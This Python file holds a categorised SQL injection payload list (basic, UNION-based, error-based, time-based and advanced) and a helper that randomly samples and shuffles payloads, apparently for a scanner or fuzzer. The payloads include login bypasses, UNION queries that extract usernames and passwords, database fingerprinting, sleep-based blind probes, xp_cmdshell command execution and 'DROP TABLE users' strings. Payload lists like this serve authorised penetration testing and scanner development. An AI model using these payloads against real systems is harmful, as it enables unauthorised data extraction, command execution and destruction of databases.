# Contains SQL injection payloads and functions for payload selection
import random
from typing import Dict, List

SQL_PAYLOADS = {
    "basic": [
        "'", "\"", "`",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; --", "\"; --",
        "'; #", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin'/*",
        "')", "\"))",
        "') OR ('1'='1", "\")) OR (\"1\"=\"1",
        "' OR 'a'='a", "\" OR \"a\"=\"a",
        "' OR 1=1", "\" OR 1=1",
        "' OR 'x'='x'; --", "\" OR \"x\"=\"x\"; --",
        "' OR 'text'='text'", "\" OR \"text\"=\"text\""
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT database()--",
        "' UNION SELECT version()--",
        "' UNION SELECT user()--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT * FROM users--",
        "' UNION SELECT NULL, NULL, NULL FROM dual--",
        "' UNION SELECT 1, 'admin', 'password'--",
        "' UNION SELECT 1, @@version, NULL--",
        "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--"
    ],
    "error_based": [
        "' AND 1=CONVERT(INT, (SELECT @@version))--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
        "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 AND SLEEP(5)--",
        "' AND 1=1/0--",
        "' AND 1=CAST((SELECT 'test') AS INT)--",
        "' AND 1=(SELECT 1 FROM INFORMATION_SCHEMA.TABLES)--",
        "' AND 1=(SELECT 1 FROM DUAL)--",
        "' AND 1=(SELECT 1 FROM non_existent_table)--",
        "' AND 1=(SELECT 1 FROM users WHERE username='admin')--",
        "' AND 1=(SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=8)--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5('test'))--",
        "' OR SLEEP(10)--",
        "' OR pg_sleep(10)--",
        "' OR WAITFOR DELAY '0:0:10'--",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
        "' OR SLEEP(5) AND '1'='1--",
        "' OR SLEEP(5) AND 'x'='x--",
        "' OR SLEEP(5) AND 'text'='text--"
    ],
    "advanced": [
        "'/**/OR/**/'1'='1",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
        "' OR 1=1/**/--",
        "' OR '1'='1'/**/--",
        "'; DROP TABLE users--",
        "%27%20OR%20%271%27%3D%271",  # URL-encoded: ' OR '1'='1
        "\" OR \"1\"=\"1\"--",
        "%22%20OR%20%221%22%3D%221",  # URL-encoded: " OR "1"="1
        "' OR '1'='1' UNION SELECT 1,2,3--",
        "' OR '1'='1' UNION SELECT * FROM users--",
        "' OR '1'='1' AND SLEEP(5)--",
        "' OR '1'='1' AND 1=CAST((SELECT 'test') AS INT)--",
        "' OR '1'='1' AND 1=(SELECT 1 FROM DUAL)--",
        "' OR '1'='1' AND 1=(SELECT 1 FROM non_existent_table)--"
    ]
}

def get_random_payloads(sql_payloads: Dict = SQL_PAYLOADS, num_payloads: int = 5) -> List[str]:
    """
    Selects a random subset of payloads from each category and returns shuffled results.
    
    Args:
        sql_payloads: Dictionary containing payload categories (default: SQL_PAYLOADS)
        num_payloads: Number of payloads to select from each category (default: 5)
    
    Returns:
        List of randomly selected payloads shuffled across categories
    
    Raises:
        ValueError: If num_payloads is not a positive integer
    """
    # Input validation
    if num_payloads < 1:
        raise ValueError("num_payloads must be a positive integer")
    
    selected_payloads = []
    
    for category_payloads in sql_payloads.values():
        if not category_payloads:
            continue  # Skip empty categories
            
        # Determine safe sample size and get random payloads
        sample_size = min(num_payloads, len(category_payloads))
        selected_payloads.extend(random.sample(category_payloads, sample_size))
    
    # Shuffle final results to mix categories
    random.shuffle(selected_payloads)
    return selected_payloads


# Example usage
if __name__ == "__main__":
    # Get 5 random payloads
    random_payloads = get_random_payloads()
    print("Randomly Selected Payloads:")
    for payload in random_payloads:
        print(payload)